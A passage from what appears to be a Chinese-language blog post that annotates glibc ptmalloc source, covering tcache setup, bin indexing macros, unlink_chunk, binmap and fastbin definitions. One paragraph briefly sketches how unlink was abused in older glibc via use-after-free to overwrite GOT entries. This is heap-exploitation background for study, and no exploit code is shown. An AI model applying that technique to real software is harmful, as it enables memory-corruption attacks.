ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">size_t</span> bytes = <span class="keyword">sizeof</span> (tcache_perthread_struct);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (tcache_shutting_down)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In a low memory situation, we may not be able to allocate memory</span></span><br><span class="line"><span class="comment">     - in which case, we just keep trying later.  However, we</span></span><br><span class="line"><span class="comment">     typically do this very early, so either there is sufficient</span></span><br><span class="line"><span class="comment">     memory, or there isn&#x27;t enough memory to do non-trivial</span></span><br><span class="line"><span class="comment">     allocations anyway.  */</span></span><br><span class="line">  <span class="keyword">if</span> (victim)</span><br><span class="line">    &#123;</span><br><span class="line">      tcache = (tcache_perthread_struct *) victim;</span><br><span class="line">      <span class="built_in">memset</span> (tcache, <span class="number">0</span>, <span class="keyword">sizeof</span> (tcache_perthread_struct));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> MAYBE_INIT_TCACHE() \</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (tcache == <span class="literal">NULL</span>)) \</span><br><span class="line">    tcache_init();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span>  <span class="comment">/* !USE_TCACHE */</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> MAYBE_INIT_TCACHE()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">tcache_thread_shutdown (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Nothing to do if there is no thread cache.  */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* !USE_TCACHE  */</span></span></span><br></pre></td></tr></table></figure><p>这些好像有点多，一些函数的实现挪到后面malloc的地方再详细讲吧</p><h5 id="一些bin相关的宏"><a href="#一些bin相关的宏" class="headerlink" title="一些bin相关的宏"></a>一些bin相关的宏</h5><p>接下来是有关bin的宏，先贴一个在源码中对bins的简介。(这里就不翻译了x</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Bins</span></span><br><span class="line"><span class="comment">    An array of bin headers for free chunks. Each bin is doubly</span></span><br><span class="line"><span class="comment">    linked.  The bins are approximately proportionally (log) spaced.</span></span><br><span class="line"><span class="comment">    There are a lot of these bins (128). This may look excessive, but</span></span><br><span class="line"><span class="comment">    works very well in practice.  Most bins hold sizes that are</span></span><br><span class="line"><span class="comment">    unusual as malloc request sizes, but are more usual for fragments</span></span><br><span class="line"><span class="comment">    and consolidated sets of chunks, which is what these bins hold, so</span></span><br><span class="line"><span class="comment">    they can be found quickly.  All procedures maintain the invariant</span></span><br><span class="line"><span class="comment">    that no consolidated chunk physically borders another one, so each</span></span><br><span class="line"><span class="comment">    chunk in a list is known to be preceeded and followed by either</span></span><br><span class="line"><span class="comment">    inuse chunks or the ends of memory.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Chunks in bins are kept in size order, with ties going to the</span></span><br><span class="line"><span class="comment">    approximately least recently used chunk. Ordering isn&#x27;t needed</span></span><br><span class="line"><span class="comment">    for the small bins, which all contain the same-sized chunks, but</span></span><br><span class="line"><span class="comment">    facilitates best-fit allocation for larger chunks. These lists</span></span><br><span class="line"><span class="comment">    are just sequential. Keeping them in order almost never requires</span></span><br><span class="line"><span class="comment">    enough traversal to warrant using fancier ordered data</span></span><br><span class="line"><span class="comment">    structures.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Chunks of the same size are linked with the most</span></span><br><span class="line"><span class="comment">    recently freed at the front, and allocations are taken from the</span></span><br><span class="line"><span class="comment">    back.  This results in LRU (FIFO) allocation order, which tends</span></span><br><span class="line"><span class="comment">    to give each chunk an equal opportunity to be consolidated with</span></span><br><span class="line"><span class="comment">    adjacent freed chunks, resulting in larger free chunks and less</span></span><br><span class="line"><span class="comment">    fragmentation.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    To simplify use in double-linked lists, each bin header acts</span></span><br><span class="line"><span class="comment">    as a malloc_chunk. This avoids special-casing for headers.</span></span><br><span class="line"><span class="comment">    But to conserve space and improve locality, we allocate</span></span><br><span class="line"><span class="comment">    only the fd/bk pointers of bins, and then use repositioning tricks</span></span><br><span class="line"><span class="comment">    to treat these as the fields of a malloc_chunk*.</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>一些bins的宏。简单来说我们free的chunk不会马上返还给系统，而是放入bins中，如果之后有一些内存申请请求，而我们的bins中又有合适的chunk，就会根据情况返回。这也是局部性的一种体现。</p><p>当然bins的组织也是五花八门的，有用单链表的，有用双链表的。而且在合适的时机会有合并的操作。我们在这先有个大致轮廓，一般而言我们的bins有如下几种</p><ul><li>Tcache bin</li><li>Fast bin</li><li>Small bin</li><li>Large bin</li><li>Unsorted bin</li></ul><p>其实看名字也大致能知道相应的bins存放着什么样的free chunk</p><p>需要注意的是感觉现在Tcache bin 占了大头，需要好好分析一下</p><p>预知详细如何，后文再见分晓(雾)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*定义了 mbinptr的数据类型*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> *<span class="title">mbinptr</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* addressing -- note that bin_at(0) does not exist */</span>(</span><br><span class="line"><span class="comment">/*求某个bin的地址(bin[0]不存在)*/</span></span><br><span class="line">#define bin_at(m, i) \</span><br><span class="line">  (mbinptr) (((<span class="keyword">char</span> *) &amp;((m)-&gt;bins[((i) - <span class="number">1</span>) * <span class="number">2</span>]))      \</span><br><span class="line">             - offsetof (struct malloc_chunk, fd))</span><br><span class="line"></span><br><span class="line"><span class="comment">/* analog of ++bin */</span></span><br><span class="line"><span class="comment">/* 取得下一个bin的地址 */</span></span><br><span class="line">#define next_bin(b)  ((mbinptr) ((<span class="keyword">char</span> *) (b) + (<span class="keyword">sizeof</span> (mchunkptr) &lt;&lt; <span class="number">1</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Reminders about list directionality within bins */</span></span><br><span class="line"><span class="comment">// 获取bin位于链表头的chunk</span></span><br><span class="line">#define first(b)     ((b)-&gt;fd)</span><br><span class="line"><span class="comment">//获取bin位于链表尾的chunk</span></span><br><span class="line">#define last(b)      ((b)-&gt;bk)</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Indexing</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Bins for sizes &lt; 512 bytes contain chunks of all the same size, spaced</span></span><br><span class="line"><span class="comment">    8 bytes apart. Larger bins are approximately logarithmically spaced:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    64 bins of size       8</span></span><br><span class="line"><span class="comment">    32 bins of size      64</span></span><br><span class="line"><span class="comment">    16 bins of size     512</span></span><br><span class="line"><span class="comment">     8 bins of size    4096</span></span><br><span class="line"><span class="comment">     4 bins of size   32768</span></span><br><span class="line"><span class="comment">     2 bins of size  262144</span></span><br><span class="line"><span class="comment">     1 bin  of size what&#x27;s left</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    There is actually a little bit of slop in the numbers in bin_index</span></span><br><span class="line"><span class="comment">    for the sake of speed. This makes no difference elsewhere.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The bins top out around 1MB because we expect to service large</span></span><br><span class="line"><span class="comment">    requests via mmap.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Bin 0 does not exist.  Bin 1 is the unordered list; if that would be</span></span><br><span class="line"><span class="comment">    a valid chunk size the small bins are bumped up one.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//bins的总数(其实只有127个，bin[0]不存在)</span></span><br><span class="line">#define NBINS             <span class="number">128</span></span><br><span class="line"><span class="comment">//small bins的总数</span></span><br><span class="line">#define NSMALLBINS         <span class="number">64</span></span><br><span class="line">#define SMALLBIN_WIDTH    MALLOC_ALIGNMENT</span><br><span class="line">#define SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; CHUNK_HDR_SZ)</span><br><span class="line"><span class="comment">//最小的应归为large bin的free chunk的size</span></span><br><span class="line">#define MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断free chunk的size是否属于smallbin</span></span><br><span class="line">#define in_smallbin_range(sz)  \</span><br><span class="line">  ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) MIN_LARGE_SIZE)</span><br><span class="line"><span class="comment">//判断某个size的free chunk所对应的放入small bin的序号</span></span><br><span class="line">#define smallbin_index(sz) \</span><br><span class="line">  ((SMALLBIN_WIDTH == <span class="number">16</span> ? (((<span class="keyword">unsigned</span>) (sz)) &gt;&gt; <span class="number">4</span>) : (((<span class="keyword">unsigned</span>) (sz)) &gt;&gt; <span class="number">3</span>))\</span><br><span class="line">   + SMALLBIN_CORRECTION)</span><br><span class="line"><span class="comment">//同smallbin_index，针对不同字长与结构的细分</span></span><br><span class="line">#define largebin_index_32(sz)                                                \</span><br><span class="line">  (((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) &lt;= <span class="number">38</span>) ?  <span class="number">56</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) &lt;= <span class="number">20</span>) ?  <span class="number">91</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) &lt;= <span class="number">10</span>) ? <span class="number">110</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) &lt;= <span class="number">4</span>) ? <span class="number">119</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) &lt;= <span class="number">2</span>) ? <span class="number">124</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) :\</span><br><span class="line">   <span class="number">126</span>)</span><br><span class="line"><span class="comment">//和上面那个差不多</span></span><br><span class="line">#define largebin_index_32_big(sz)                                            \</span><br><span class="line">  (((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) &lt;= <span class="number">45</span>) ?  <span class="number">49</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) &lt;= <span class="number">20</span>) ?  <span class="number">91</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) &lt;= <span class="number">10</span>) ? <span class="number">110</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) &lt;= <span class="number">4</span>) ? <span class="number">119</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) &lt;= <span class="number">2</span>) ? <span class="number">124</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) :\</span><br><span class="line">   <span class="number">126</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// XXX It remains to be seen whether it is good to keep the widths of</span></span><br><span class="line"><span class="comment">// XXX the buckets the same or whether it should be scaled by a factor</span></span><br><span class="line"><span class="comment">// XXX of two as well.</span></span><br><span class="line"><span class="comment">//和上面那个差不多</span></span><br><span class="line">#define largebin_index_64(sz)                                                \</span><br><span class="line">  (((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) &lt;= <span class="number">48</span>) ?  <span class="number">48</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) &lt;= <span class="number">20</span>) ?  <span class="number">91</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) &lt;= <span class="number">10</span>) ? <span class="number">110</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) &lt;= <span class="number">4</span>) ? <span class="number">119</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) &lt;= <span class="number">2</span>) ? <span class="number">124</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) :\</span><br><span class="line">   <span class="number">126</span>)</span><br><span class="line"><span class="comment">//根据SIZE_SZ定义的大小与MALLOC_ALIGNMENT大小选择相应的largebin_index进行调用。选择合适的过程，根据size返回对应bins的序号</span></span><br><span class="line">#define largebin_index(sz) \</span><br><span class="line">  (SIZE_SZ == <span class="number">8</span> ? largebin_index_64 (sz)                                     \</span><br><span class="line">   : MALLOC_ALIGNMENT == <span class="number">16</span> ? largebin_index_32_big (sz)                     \</span><br><span class="line">   : largebin_index_32 (sz))</span><br><span class="line"></span><br><span class="line"><span class="comment">//根据size求得在bin中的序号</span></span><br><span class="line">#define bin_index(sz) \</span><br><span class="line">  ((in_smallbin_range (sz)) ? smallbin_index (sz) : largebin_index (sz))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先来总结一下。一个bins数组有128个元素，对应了不同类型的bin。bins数组的元素复用了malloc_chunk的fd与bk，并通过这两个字段来实现对bin中的chunk的索引</p><ul><li>bins[0]不存在</li><li>bins[1]是unsorted bin</li><li>bins[2]-bins[63]是small bin</li><li>剩下的是large bin</li></ul><p>ptmalloc将<code>unsorted bin</code>、<code>small bin</code>以及<code>large bin</code>放在一个bins数组中以管理。而<code>fastbin</code>和<code>tcache bin</code>有另外的字段进行管理。</p><h5 id="unlink操作"><a href="#unlink操作" class="headerlink" title="unlink操作"></a>unlink操作</h5><p>接下来是一个比较重要的操作:<code>unlink_chunk</code></p><p>这个<code>unlink_chunk</code>值得单独拿出来分析一下。这个是个常用的操作，简单来说就是把本来链在某个bins里面的chunk给取出来，一般在某个bins中有我们想要的大小合适的chunk的时候调用它把这个chunk从bins中取出来。在<code>malloc_consolidate</code>中常常调用它进行chunk的前向与后向合并。这个在早期的glibc中是个常见的利用方式，如果存在UAF的话很容易把bss上面的地址进行更改，然后修改原本存堆地址的地方为got表地址(如果能泄露libc的话)，进而覆写。</p><p>这个unlink在之前的博客中分析过，但是为了内容的完整性可以再分析一下(而且我已经好久没看大概已经忘了，大部分时候都是利用的时候现学X)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">unlink_chunk (mstate av, mchunkptr p)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line"></span><br><span class="line">  mchunkptr fd = p-&gt;fd;</span><br><span class="line">  mchunkptr bk = p-&gt;bk;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line"></span><br><span class="line">  fd-&gt;bk = bk;</span><br><span class="line">  bk-&gt;fd = fd;</span><br><span class="line">  <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (p-&gt;fd_nextsize-&gt;bk_nextsize != p</span><br><span class="line">  || p-&gt;bk_nextsize-&gt;fd_nextsize != p)</span><br><span class="line">malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (fd-&gt;fd_nextsize == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (p-&gt;fd_nextsize == p)</span><br><span class="line">    fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      fd-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">      fd-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">      p-&gt;fd_nextsize-&gt;bk_nextsize = fd;</span><br><span class="line">      p-&gt;bk_nextsize-&gt;fd_nextsize = fd;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">  p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>(unlink 分析)</p><h5 id="Binmap相关的宏"><a href="#Binmap相关的宏" class="headerlink" title="Binmap相关的宏"></a>Binmap相关的宏</h5><p>Binmap是为了表示哪个bin有free的chunk而被设计出来的(如果嗯遍历bins和FastbinY之类的非常耗时)。主要是以类似比特向量的形式,如果哪个bin中有chunk，相应的比特位就被置位</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Binmap</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    To help compensate for the large number of bins, a one-level index</span></span><br><span class="line"><span class="comment">    structure is used for bin-by-bin searching.  `binmap&#x27; is a</span></span><br><span class="line"><span class="comment">    bitvector recording whether bins are definitely empty so they can</span></span><br><span class="line"><span class="comment">    be skipped over during during traversals.  The bits are NOT always</span></span><br><span class="line"><span class="comment">    cleared as soon as bins are empty, but instead only</span></span><br><span class="line"><span class="comment">    when they are noticed to be empty during traversal in malloc.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Conservatively use 32 bits per map word, even if on 64bit system */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BINMAPSHIFT      5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BITSPERMAP       (1U &lt;&lt; BINMAPSHIFT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BINMAPSIZE       (NBINS / BITSPERMAP)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> idx2block(i)     ((i) &gt;&gt; BINMAPSHIFT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> idx2bit(i)       ((1U &lt;&lt; ((i) &amp; ((1U &lt;&lt; BINMAPSHIFT) - 1))))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mark_bin(m, i)    ((m)-&gt;binmap[idx2block (i)] |= idx2bit (i))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unmark_bin(m, i)  ((m)-&gt;binmap[idx2block (i)] &amp;= ~(idx2bit (i)))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> get_binmap(m, i)  ((m)-&gt;binmap[idx2block (i)] &amp; idx2bit (i))</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="Fastbins相关宏"><a href="#Fastbins相关宏" class="headerlink" title="Fastbins相关宏"></a>Fastbins相关宏</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> *<span class="title">mfastbinptr</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[idx])</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* offset 2 to use otherwise unindexable first 2 bins */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin_index(sz) \</span></span><br><span class="line">  ((((<span class="keyword">unsigned</span> <span class="keyword">int</span>) (sz)) &gt;&gt; (SIZE_SZ == <span class="number">8</span> ? <span class="number">4</span> : <span class="number">3</span>)) - <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The maximum fastbin request size we support */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_FAST_SIZE     (80 * SIZE_SZ / 4)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFASTBINS  (fastbin_index (request2size (MAX_FAST_SIZE)) + 1)</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   FASTBIN_CONSOLIDATION_THRESHOLD is the size of a chunk in free()</span></span><br><span class="line"><span class="comment">   that triggers automatic consolidation of possibly-surrounding</span></span><br><span class="line"><span class="comment">   fastbin chunks. This is a heuristic, so the exact value should not</span></span><br><span class="line"><span class="comment">   matter too much. It is defined at half the default trim threshold as a</span></span><br><span class="line"><span class="comment">   compromise heuristic to only attempt consolidation if it is likely</span></span><br><span class="line"><span class="comment">   to lead to trimming. However, it is not dynamically tunable, 